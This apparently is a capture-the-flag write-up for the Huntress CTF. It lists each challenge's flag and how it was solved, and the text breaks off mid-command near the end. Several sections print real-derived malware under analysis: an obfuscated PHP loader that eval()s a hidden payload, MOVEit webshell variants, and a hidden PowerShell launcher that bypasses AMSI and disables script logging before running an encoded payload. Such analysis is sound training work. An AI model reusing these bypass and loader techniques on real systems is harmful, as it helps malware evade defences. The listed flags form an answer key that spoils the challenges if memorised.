# Huntress CTF

## Notepad

### Description

> Just a sanity check... you do know how to use a computer, right?
>
> Download the files below.
>
> Attachments: notepad

### Flag

flag{2dd41e3da37ef1238954d8e7f3217cd8}

### Solution

The flag is in the attached `notepad` file.

```console
root@kali:~/ctf/HuntressCTF/Notepad# cat notepad
+------------------------------------------------------+
| [✖] [□] [▬]  Notepad                              - |
|------------------------------------------------------|
| File   Edit   Format   View   Help                   |
|------------------------------------------------------|
|                                                      |
|                                                      |
|   New Text Document - Notepad                        |
|                                                      |
|     flag{2dd41e3da37ef1238954d8e7f3217cd8}           |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
+------------------------------------------------------+
| Ln 1, Col 40                                         |
+------------------------------------------------------+
```

## Technical Support

### Description

> Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?
>
> This CTF uses support tickets to help handle requests. If you need assistance, please create a ticket with the **#ctf-open-ticket** channel. You do not need to direct message any CTF organizers or facilitators, they will just tell you to open a ticket. You might find a flag in the ticket channel, though!
>
> Connect here:
>
> Join the Discord!

### Flag

flag{a98373a74abb8c5ebb8f5192e034a91c}

### Solution

Looking at `#ctf-open-ticket` channel, found flag in the message.

![flag_technical_support.png](img/flag_technical_support.png)

## String Cheese

### Description

> Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though...
>
> Download the file(s) below.
>
> Attachments: cheese.jpg

### Flag

flag{f4d9f0f70bf353f2ca23d81dcf7c9099}

### Solution

I got the flag by `strings` command.

```console
root@kali:~/ctf/HuntressCTF# strings cheese.jpg | grep flag
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```

## Read The Rules

### Description

> Please follow the rules for this CTF!
>
> Connect here:
>
> [Read The Rules](https://huntress.ctf.games/rules)

### Flag

flag{90bc54705794a62015369fd8e86e557b}

### Solution

The flag is in HTML source code.

```console
root@kali:~/ctf/HuntressCTF# curl -s https://huntress.ctf.games/rules | grep -oE 'flag{[0-9a-fA-F]{32}}'
flag{90bc54705794a62015369fd8e86e557b}
```

## Query Code

### Description

> What's this?
>
> Download the file(s) below.
>
> Attachments: query_code

### Flag

flag{3434cf5dc6a865657ea1ec1cb675ce3b}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file query_code
query_code: PNG image data, 111 x 111, 1-bit colormap, non-interlaced
```

The attached `query_code` file is PNG image and it's the following.

![query_code](img/query_code.png)

This file is QR Code, and therefore I decode it.
[`zbarimg`](https://github.com/mchehab/zbar) command is useful, which is provided by `zbar-tools` package in Debian-based distribution.

```console
root@kali:~/ctf/HuntressCTF# apt install zbar-tools
(snip)
root@kali:~/ctf/HuntressCTF# zbarimg query_code
QR-Code:flag{3434cf5dc6a865657ea1ec1cb675ce3b}

scanned 1 barcode symbols from 1 images in 0.04 seconds
```

## Zerion

### Description

> We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: zerion

### Flag

flag{af10370d485952897d5183aa09e19883}

### Solution

The attached file is obfuscated PHP code.

Beautified:

```php
<?php $L66Rgr = explode(base64_decode("Pz4="), file_get_contents(__FILE__));
$L6CRgr = [
    base64_decode("L3gvaQ=="),
    base64_decode("eA=="),
    base64_decode(strrev(str_rot13($L66Rgr[1]))),
];
$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
preg_replace($L6CRgr[0], serialize(eval($L6CRgr[2])), $L6CRgr[1]);
exit(); ?>
==Dstfmo (snip)
```

In L1, it reads the content of this file by using `file_get_contents(__FILE__)`.
`Pz4=` is Base64 encoded string and the decoded string is `?>`.
[`explode`](https://www.php.net/manual/en/function.explode.php) is the function to split a string.
Thus, `$L66Rgr[1]` is the string starting with `==Dstfmo` after `?>`.
In L5, `$L66Rgr[1]` is rotated by 13 places ([ROT13](`$L66Rgr[1]`)), reversed, and Base64 decoded.
Decoded it, got flag.

```console
root@kali:~/ctf/HuntressCTF# vi tmp.txt  # save the string starting with `==Dstfmo` after `?>`

root@kali:~/ctf/HuntressCTF# cat tmp.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d | grep -o 'flag{.*}'
flag{af10370d485952897d5183aa09e19883}
```

## Book By Its Cover

### Description

> They say you aren't supposed to judge a book by its cover, but this is one of my favorites!
>
> Download the file below.
>
> Attachments: book.rar

### Flag

flag{f8d32a346745a6c4bf4e9504ba5308f0}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file book.rar
book.rar: PNG image data, 800 x 200, 8-bit/color RGB, non-interlaced
```

The extension of attached filename is .rar, but it is PNG image file.

This PNG is the following:

![book.rar](img/book.rar.png)

I can copy it manually or use [tesseract](https://github.com/tesseract-ocr/tesseract) to extract the characters using OCR.

```console
root@kali:~/ctf/HuntressCTF# tesseract book.rar -
Estimating resolution as 372
flag {f8d32a346745a6c4bf4e9504ba5308f0}
```

## HumanTwo

### Description

> During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the human2.aspx webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: human2.aspx_iocs.zip

### Flag

flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}

### Solution

```console
root@kali:~/ctf/HuntressCTF# mkdir tmp

root@kali:~/ctf/HuntressCTF# unzip -d tmp human2.aspx_iocs.zip
Archive:  human2.aspx_iocs.zip
  inflating: tmp/ea0d98c023fb788809906e2d670e98d76d6f42b0efd76611ec698044876e5f3a
  inflating: tmp/f5983c8f11f4364774511065c11b23f9fcd46f2ddb23a88b8097cda816ef84a3
  inflating: tmp/4418fa01c8088d7176342225b0788c9ff74950624aed38aa210f90777765a3bf
```

The attached `human2.aspx_iocs.zip` file is zip archive.
Extracted it, many files were unzipped.

These file is similar to [C:\MOVEitTransfer\wwwroot\human2.aspx](https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643).
I'll try to find the diff.

```console
root@kali:~/ctf/HuntressCTF# curl -sLO https://gist.githubusercontent.com/JohnHammond/44ce8556f798b7f6a7574148b679c643/raw/35b0f4e4838b0e133386aa9ada3927048e5821ba/human2.aspx

root@kali:~/ctf/HuntressCTF# diff human2.aspx tmp/000ce897ff8a17528a3116dcf74380a8c67be7d11e9bff038397df4fdf5fc5f4
36c36
<     if (!String.Equals(pass, "REDACTEDREDACTEDREDACTEDREDACTED")) {
---
>     if (!String.Equals(pass, "e11320cf-f34b-4cc8-b4e3-46b4ad6e50ab")) {
```

The diff from original file is this line included `!String.Equals`.
Looking at this line in extracted files.

```console
root@kali:~/ctf/HuntressCTF# grep '!String.Equals' -R tmp
(snip)
tmp/e72b948380b8f7d7d797d2277176057f6b453e9a3a3dbdaa4ae04057d5497af0:    if (!String.Equals(pass, "709d4650-051e-4aa3-96eb-ddc750bc7250")) {
tmp/cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19:    if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000")) {
(snip)
```

`cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19` file is only difference from the others.
Unhexed it, got flag.

```python
>>> import binascii
>>> binascii.unhexlify("666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d-0000-0000-000000000000".replace("-", ""))
b'flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

#### References

- [MOVEit Transfer Critical Vulnerability CVE-2023-34362 Rapid Response](https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response)

## Hot Off The Press

### Description

> Oh wow, a malware analyst shared a sample that I [read about in the news!](https://www.huntress.com/blog/critical-vulnerabilities-ws_ftp-exploitation)
>
> But it looks like they put it in some weird kind of archive...? Anyway, the password should be infected as usual!
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: hot_off_the_press

### Flag

flag{dbfe5f755a898ce5f2088b0892850bf7}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file hot_off_the_press
hot_off_the_press: UHarc archive data
```

The attached `hot_off_the_press` file is UHArchive.
Extracting it in Windows10 with [UHARC CMD](https://sam.gleske.net/uharc/).

```powershell
C:\Program Files (x86)\UHARC CMD\bin>uharc.exe e -pw hot_off_the_press.uha

UHARC 0.6b  -----   high compression multimedia archiver   -----   BETA version
Copyright (c) 1997-2005 by Uwe Herklotz     All rights reserved     01 Oct 2005
****  Freeware for non-commercial use  ****  contact: uwe.herklotz@gmx.de  ****

Processing archive "hot_off_the_press.uha" (created: 02-Oct-2023, 23:24).
Using password.
Using 1.7 MB for decompression and 50 KB for file buffers.

Extracting 1 file (4918 bytes)
-------------------------------------------------------------------------------
Completed successfully (0.0 sec)                                   All files OK

C:\Program Files (x86)\UHARC CMD\bin>dir
 Volume in drive C has no label.
 Volume Serial Number is 4663-FA89

 Directory of C:\Program Files (x86)\UHARC CMD\bin

10/04/2023  08:31 AM    <DIR>          .
10/04/2023  08:31 AM    <DIR>          ..
10/04/2023  08:23 AM    <DIR>          Contrib
10/02/2023  11:24 PM             4,918 hot_off_the_press.ps1
10/04/2023  08:23 AM             2,841 hot_off_the_press.uha
06/06/2009  02:41 PM           496,128 makensis.exe
10/04/2023  08:23 AM    <DIR>          Plugins
10/04/2023  08:23 AM    <DIR>          Stubs
10/01/2005  08:00 AM           111,104 uharc.exe
               4 File(s)        614,991 bytes
               5 Dir(s)  89,786,978,304 bytes free
```

`hot_off_the_press.ps1` file is extracted and this file is obfuscated Powershell script.

hot_off_the_press.ps1

```powershell
C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''+''oX7zCWHxBjby+UR''+''jzwaTw4OWq''+''kQ{1}M''+''u8XW2''+''DtJM{1}''+''omtGI''+''TFM8he5nIGAnbP''+''rOfiSf''+''Cfat2qb8W''+''uPFW{0}rlufP''+''gOzYcaD''+''GTrnvKbeq/''+''SWj0tC/ftXN8U5''+''9Uj2+ST2''+''WGHp/nUiIqgFjuk''+''l+mGrCi/USDN2''+''hvuAJn8rqJY''+''13G9VBn''+''HhTcNHa''+''ChyQMx4''+''kul''+''nZ{0}{1}a''+''AT{1}Wcr0kZyUUMHa''+''tdwX0''+''7CAQkiW6RsTI''+''/nkx+N8bF''+''3{0}00''+''ljS''+''CaieWIPiyD''+''2JFfUiq''+''n704YNC''+''D6QS1+l{0}Q''+''OJyYJoq''+''t+AIM{0}U4Zs8''+''i/MWO4c''+''Fsi91olY1sJpbpS''+''mBYG''+''9Jl1OjxIG''+''eSa+jOO''+''5kl''+''g4pcngl''+''n5UalMy7''+''yJvPq''+''3o6eZs2mX''+''3zgbAHTX6PK''+''{1}Zr''+''qHp''+''GYRBy''+''f2JBdrbGoXIgVz''+''sgGbaNGe/Yf''+''1SmP1UhP1V''+''u0U''+''e8ZDToP''+''JRn0r''+''7tr0pj38q{1}''+''ReTuIjmNI''+''YjtaxF1G/''+''zFPjuWjAl{1}{1}GR''+''7UUc9{1}9Qy8''+''GIDgCB''+''q{1}nFb4qKZ6oHU''+''dUbnSbKWUB''+''CNvHiCb''+''oFQbbfO''+''xMHjJD78QORAhd3''+''sYs''+''1aa4O6''+''CU{0}nb''+''{1}upxdtVFIbz{1}v''+''SSzSTXF7+hbpg8c''+''gsIgdJ7QYs''+''lPJs6r+4K6T''+''Mkl9{0}5Glu''+''Yn5{1}5zFtC''+''0eJ1KkPgYVIbj''+''o{0}8''+''GnHlOIWO''+''QzDaC57''+''tOwnF5/Fo+Wxx''+''juG7S0wnhgj8''+''Kh{0}1Wq''+''CPQ0Swuz2g''+''fZiZYMIpTJjosT5''+''oV4''+''OBS7I''+''8st{0}4RAf8HRc''+''hPkGa+Q''+''KSHZchP''+''D3WdcWmRIhcTDR6''+''GM2fVfnHhy''+''6uTOtAQ''+''UwTGyvTVur''+''qXKfi0+P''+''W8sVI4WAGVwCI''+''lQn''+''AgeNb0{1}ftv{0}Dxjj''+''Q6dlh+/lvbyX''+''9/K/{0}22X+XG''+''vHr''+''RZ0mnV635''+''0N7''+''+6d''+''Pmob8sR''+''bf{0}gc+/2j''+''O6vT''+''ufHt856786''+''dO6lz{1}e5i''+''e302D2/PjuxV''+''tzFMr''+''xqfFqP{0}3nQU3''+''c1G''+''9zXmzq+''+''YGzn4P8b''+''iM7f''+''Rwf85lk''+''4+Nh8w5''+''36Q1Z17P6vn7''+''WP8h1gW2R/n+0''+''m2g8UuZ''+''M{0}M3kN7UYyHh''+''T17M5+aw22''+''ch1+GvZO{0}oc3+bF''+''+FX2jz''+''PmifrIOWvTq''+''nNhse''+''D91Ba+iPwsPD''+''D2ZlPKCx3G1M1{1}W''+''+qwhS''+''RWP+p/''+''2tS+Al6''+''ud4''+''Ipl5DC8H5HTl''+''FX3C''+''xUnB1{0}qcKg3DU''+''{1}x/''+''ASIGhvQYCXR5sd''+''mMcV+RxJzSIUP''+''NeaOisYNO''+''5tVzNZNsBM0''+''H9lh2HRyM''+''0{1}u8{0}{0}O7rH''+''oKcShnVu1ut1ZD''+''7le7q+3htfj6''+''pbX4cm3ktix''+''FHjNwNtZZZt2s''+''0CkxjDfHC9''+''8H{1}unK{0}xB7C''+''Tyce''+''4H0AvlOfukrCJ''+''ucs20A''+''i5Vt8''+''u{1}R''+''fghcHVc/Vq+''+''D{0}FPQxA7''+''c{1}{1}0q/rzFxrX0''+''+uz6TZOnIC8z/AX''+''/mDwPfb8YfVVC1a''+''wcoCfd''+''jzseiN/bIX''+''DpUYmCf''+''aRhDPKHwQtAFB''+''tmK8gqP{0}gbpsWn''+''Hspnq''+''dxx8''+''emlmODf2GZMc5''+''4PA''+''AA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```

Extract `$x_wa3=((' ...`

```powershell
$x_wa3 = (('Sc' + ' { 2 }i' + 'pt { 1 }loc { 0 }Logg' + 'in' + 'g') -f 'k', 'B', 'r');
If ($PSVersionTable.PSVersion.Major -ge 3) {
    $sw = (('E' + 'nable { 3 }' + 'c { ' + '1 }' + 'ip { 0 }Bloc { 2 }Logging' + '') -f 't', 'r', 'k', 'S');
    $p8 = [Collections.Generic.Dictionary[string, System.Object]]::new();
    $gG0 = (('Ena' + 'ble { 2 }c { 5 }i { 3 }t { ' + '4 }loc' + ' { 0 } { 1 }' + 'nv' + 'o' + 'cationLoggi' + 'ng') -f 'k', 'I', 'S', 'p', 'B', 'r');
    $jXZ4D = [Ref].Assembly.GetType(((' { 0 }y' + 's' + 'tem. { 1 }a' + 'n' + 'a { 4 }ement.A { 5 }t' + 'omati' + 'on. { 2' + ' }ti { 3 }s') -f 'S', 'M', 'U', 'l', 'g', 'u'));
    $plhF = [Ref].Assembly.GetType(((' { ' + '6 } { ' + '5 }stem.' + ' { ' + '3' + ' } { 9 }' + 'n { 9 } { ' + '2 }ement' + '. { ' + '8 } { ' + '4 }t { ' + '7' + ' }' + 'm { 9 }ti { 7 }n' + '.' + ' { 8' + ' }' + 'm' + 'si { 0' + ' }ti { ' + '1 }s') -f 'U', 'l', 'g', 'M', 'u', 'y', 'S', 'o', 'A', 'a'));
    if ($plhF) { $plhF.GetField((('' + 'a { ' + '0 }' + 'si { 4 }' + 'nit { ' + '1 }' + 'ai' + 'l { 2 } { ' + '3 }') -f 'm', 'F', 'e', 'd', 'I'), 'NonPublic, Static').SetValue($null, $true); };
    $lCj = $jXZ4D.GetField('cachedGroupPolicySettings', 'NonPublic, Static');
    If ($lCj) {
        $a938 = $lCj.GetValue($null);
        If ($a938[$x_wa3]) {
            $a938[$x_wa3][$sw] = 0;
            $a938[$x_wa3][$gG0] = 0;
        } $p8.Add($gG0, 0); $p8.Add($sw, 0); $a938['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $x_wa3] = $p8;
    }
    Else {
        [Ref].Assembly.GetType((('S { 2 } { 3 }' + 't' + 'em' + '.Mana' + 'ge' + 'ment. { ' + '5 } { 4 }to' + 'mation.Scr' + 'ipt { 1 }loc { 0 }') -f 'k', 'B', 'y', 's', 'u', 'A')).GetField('signatures', 'NonPublic, Static').SetValue($null, (New-Object Collections.Generic.HashSet[string]));
    }
};
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String((('H4sI' + 'AIeJ' + 'G2UC/+1X' + 'bU/jOBD+3l9hrS' + 'IlkU { 0 }' + 'VFvb { 1 }IiFdWqD' + 'bPRJKS8vR' + 'brUKy' + 'TR168TFcQplb//7' + 'jfNSygJ73 { 1 }lI94F' + 'IVvwyMx4/M' + '7YfT9PYl5TH' + 'hH7sku8VUnxd' + 'T3gRMTT/ku' + '/fWUSjS3Mzp' + 'oX7zCWHxBjby+UR' + 'jzwaTw4OWq' + 'kQ { 1 }M' + 'u8XW2' + 'DtJM { 1 }' + 'omtGI' + 'TFM8he5nIGAnbP' + 'rOfiSf' + 'Cfat2qb8W' + 'uPFW { 0 }rlufP' + 'gOzYcaD' + 'GTrnvKbeq/' + 'SWj0tC/ftXN8U5' + '9Uj2+ST2' + 'WGHp/nUiIqgFjuk' + 'l+mGrCi/USDN2' + 'hvuAJn8rqJY' + '13G9VBn' + 'HhTcNHa' + 'ChyQMx4' + 'kul' + 'nZ { 0 } { 1 }a' + 'AT { 1 }Wcr0kZyUUMHa' + 'tdwX0' + '7CAQkiW6RsTI' + '/nkx+N8bF' + '3 { 0 }00' + 'ljS' + 'CaieWIPiyD' + '2JFfUiq' + 'n704YNC' + 'D6QS1+l { 0 }Q' + 'OJyYJoq' + 't+AIM { 0 }U4Zs8' + 'i/MWO4c' + 'Fsi91olY1sJpbpS' + 'mBYG' + '9Jl1OjxIG' + 'eSa+jOO' + '5kl' + 'g4pcngl' + 'n5UalMy7' + 'yJvPq' + '3o6eZs2mX' + '3zgbAHTX6PK' + ' { 1 }Zr' + 'qHp' + 'GYRBy' + 'f2JBdrbGoXIgVz' + 'sgGbaNGe/Yf' + '1SmP1UhP1V' + 'u0U' + 'e8ZDToP' + 'JRn0r' + '7tr0pj38q { 1 }' + 'ReTuIjmNI' + 'YjtaxF1G/' + 'zFPjuWjAl { 1 } { 1 }GR' + '7UUc9 { 1 }9Qy8' + 'GIDgCB' + 'q { 1 }nFb4qKZ6oHU' + 'dUbnSbKWUB' + 'CNvHiCb' + 'oFQbbfO' + 'xMHjJD78QORAhd3' + 'sYs' + '1aa4O6' + 'CU { 0 }nb' + ' { 1 }upxdtVFIbz { 1 }v' + 'SSzSTXF7+hbpg8c' + 'gsIgdJ7QYs' + 'lPJs6r+4K6T' + 'Mkl9 { 0 }5Glu' + 'Yn5 { 1 }5zFtC' + '0eJ1KkPgYVIbj' + 'o { 0 }8' + 'GnHlOIWO' + 'QzDaC57' + 'tOwnF5/Fo+Wxx' + 'juG7S0wnhgj8' + 'Kh { 0 }1Wq' + 'CPQ0Swuz2g' + 'fZiZYMIpTJjosT5' + 'oV4' + 'OBS7I' + '8st { 0 }4RAf8HRc' + 'hPkGa+Q' + 'KSHZchP' + 'D3WdcWmRIhcTDR6' + 'GM2fVfnHhy' + '6uTOtAQ' + 'UwTGyvTVur' + 'qXKfi0+P' + 'W8sVI4WAGVwCI' + 'lQn' + 'AgeNb0 { 1 }ftv { 0 }Dxjj' + 'Q6dlh+/lvbyX' + '9/K/ { 0 }22X+XG' + 'vHr' + 'RZ0mnV635' + '0N7' + '+6d' + 'Pmob8sR' + 'bf { 0 }gc+/2j' + 'O6vT' + 'ufHt856786' + 'dO6lz { 1 }e5i' + 'e302D2/PjuxV' + 'tzFMr' + 'xqfFqP { 0 }3nQU3' + 'c1G' + '9zXmzq+' + 'YGzn4P8b' + 'iM7f' + 'Rwf85lk' + '4+Nh8w5' + '36Q1Z17P6vn7' + 'WP8h1gW2R/n+0' + 'm2g8UuZ' + 'M { 0 }M3kN7UYyHh' + 'T17M5+aw22' + 'ch1+GvZO { 0 }oc3+bF' + '+FX2jz' + 'PmifrIOWvTq' + 'nNhse' + 'D91Ba+iPwsPD' + 'D2ZlPKCx3G1M1 { 1 }W' + '+qwhS' + 'RWP+p/' + '2tS+Al6' + 'ud4' + 'Ipl5DC8H5HTl' + 'FX3C' + 'xUnB1 { 0 }qcKg3DU' + ' { 1 }x/' + 'ASIGhvQYCXR5sd' + 'mMcV+RxJzSIUP' + 'NeaOisYNO' + '5tVzNZNsBM0' + 'H9lh2HRyM' + '0 { 1 }u8 { 0 } { 0 }O7rH' + 'oKcShnVu1ut1ZD' + '7le7q+3htfj6' + 'pbX4cm3ktix' + 'FHjNwNtZZZt2s' + '0CkxjDfHC9' + '8H { 1 }unK { 0 }xB7C' + 'Tyce' + '4H0AvlOfukrCJ' + 'ucs20A' + 'i5Vt8' + 'u { 1 }R' + 'fghcHVc/Vq+' + 'D { 0 }FPQxA7' + 'c { 1 } { 1 }0q/rzFxrX0' + '+uz6TZOnIC8z/AX' + '/mDwPfb8YfVVC1a' + 'wcoCfd' + 'jzseiN/bIX' + 'DpUYmCf' + 'aRhDPKHwQtAFB' + 'tmK8gqP { 0 }gbpsWn' + 'Hspnq' + 'dxx8' + 'emlmODf2GZMc5' + '4PA' + 'AA=') -f 'L', 'E')))), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

In kali:

```console
┌──(root㉿kali)-[/root/ctf/HuntressCTF]
└─PS> 'H4sI' + 'AIeJ' + 'G2UC/+1X' + 'bU/jOBD+3l9hrS' + 'IlkU { 0 }' + 'VFvb { 1 }IiFdWqD' + 'bPRJKS8vR' + 'brUKy' + 'TR168TFcQplb//7' + 'jfNSygJ73 { 1 }lI94F' + 'IVvwyMx4/M' + '7YfT9PYl5TH' + 'hH7sku8VUnxd' + 'T3gRMTT/ku' + '/fWUSjS3Mzp' + 'oX7zCWHxBjby+UR' + 'jzwaTw4OWq' + 'kQ { 1 }M' + 'u8XW2' + 'DtJM { 1 }' + 'omtGI' + 'TFM8he5nIGAnbP' + 'rOfiSf' + 'Cfat2qb8W' + 'uPFW { 0 }rlufP' + 'gOzYcaD' + 'GTrnvKbeq/' + 'SWj0tC/ftXN8U5' + '9Uj2+ST2' + 'WGHp/nUiIqgFjuk' + 'l+mGrCi/USDN2' + 'hvuAJn8rqJY' + '13G9VBn' + 'HhTcNHa' + 'ChyQMx4' + 'kul' + 'nZ { 0 } { 1 }a' + 'AT { 1 }Wcr0kZyUUMHa' + 'tdwX0' + '7CAQkiW6RsTI' + '/nkx+N8bF' + '3 { 0 }00' + 'ljS' + 'CaieWIPiyD' + '2JFfUiq' + 'n704YNC' + 'D6QS1+l { 0 }Q' + 'OJyYJoq' + 't+AIM { 0 }U4Zs8' + 'i/MWO4c' + 'Fsi91olY1sJpbpS' + 'mBYG' + '9Jl1OjxIG' + 'eSa+jOO' + '5kl' + 'g4pcngl' + 'n5UalMy7' + 'yJvPq' + '3o6eZs2mX' + '3zgbAHTX6PK' + ' { 1 }Zr' + 'qHp' + 'GYRBy' + 'f2JBdrbGoXIgVz' + 'sgGbaNGe/Yf' + '1SmP1UhP1V' + 'u0U' + 'e8ZDToP' + 'JRn0r' + '7tr0pj38q { 1 }' + 'ReTuIjmNI' + 'YjtaxF1G/' + 'zFPjuWjAl { 1 } { 1 }GR' + '7UUc9 { 1 }9Qy8' + 'GIDgCB' + 'q { 1 }nFb4qKZ6oHU' + 'dUbnSbKWUB' + 'CNvHiCb' + 'oFQbbfO' + 'xMHjJD78QORAhd3' + 'sYs' + '1aa4O6' + 'CU { 0 }nb' + ' { 1 }upxdtVFIbz { 1 }v' + 'SSzSTXF7+hbpg8c' + 'gsIgdJ7QYs' + 'lPJs6r+4K6T' + 'Mkl9 { 0 }5Glu' + 'Yn5 { 1 }5zFtC' + '0eJ1KkPgYVIbj' + 'o { 0 }8' + 'GnHlOIWO' + 'QzDaC57' + 'tOwnF5/Fo+Wxx' + 'juG7S0wnhgj8' + 'Kh { 0 }1Wq' + 'CPQ0Swuz2g' + 'fZiZYMIpTJjosT5' + 'oV4' + 'OBS7I' + '8st { 0 }4RAf8HRc' + 'hPkGa+Q' + 'KSHZchP' + 'D3WdcWmRIhcTDR6' + 'GM2fVfnHhy' + '6uTOtAQ' + 'UwTGyvTVur' + 'qXKfi0+P' + 'W8sVI4WAGVwCI' + 'lQn' + 'AgeNb0 { 1 }ftv { 0 }Dxjj' + 'Q6dlh+/lvbyX' + '9/K/ { 0 }22X+XG' + 'vHr' + 'RZ0mnV635' + '0N7' + '+6d' + 'Pmob8sR' + 'bf { 0 }gc+/2j' + 'O6vT' + 'ufHt856786' + 'dO6lz { 1 }e5i' + 'e302D2/PjuxV' + 'tzFMr' + 'xqfFqP { 0 }3nQU3' + 'c1G' + '9zXmzq+' + 'YGzn4P8b' + 'iM7f' + 'Rwf85lk' + '4+Nh8w5' + '36Q1Z17P6vn7' + 'WP8h1gW2R/n+0' + 'm2g8UuZ' + 'M { 0 }M3kN7UYyHh' + 'T17M5+aw22' + 'ch1+GvZO { 0 }oc3+bF' + '+FX2jz' + 'PmifrIOWvTq' + 'nNhse' + 'D91Ba+iPwsPD' + 'D2ZlPKCx3G1M1 { 1 }W' + '+qwhS' + 'RWP+p/' + '2tS+Al6' + 'ud4' + 'Ipl5DC8H5HTl' + 'FX3C' + 'xUnB1 { 0 }qcKg3DU' + ' { 1 }x/' + 'ASIGhvQYCXR5sd' + 'mMcV+RxJzSIUP' + 'NeaOisYNO' + '5tVzNZNsBM0' + 'H9lh2HRyM' + '0 { 1 }u8 { 0 } { 0 }O7rH' + 'oKcShnVu1ut1ZD' + '7le7q+3htfj6' + 'pbX4cm3ktix' + 'FHjNwNtZZZt2s' + '0CkxjDfHC9' + '8H { 1 }unK { 0 }xB7C' + 'Tyce' + '4H0AvlOfukrCJ' + 'ucs20A' + 'i5Vt8' + 'u { 1 }R' + 'fghcHVc/Vq+' + 'D { 0 }FPQxA7' + 'c { 1 } { 1 }0q/rzFxrX0' + '+uz6TZOnIC8z/AX' + '/mDwPfb8YfVVC1a' + 'wcoCfd' + 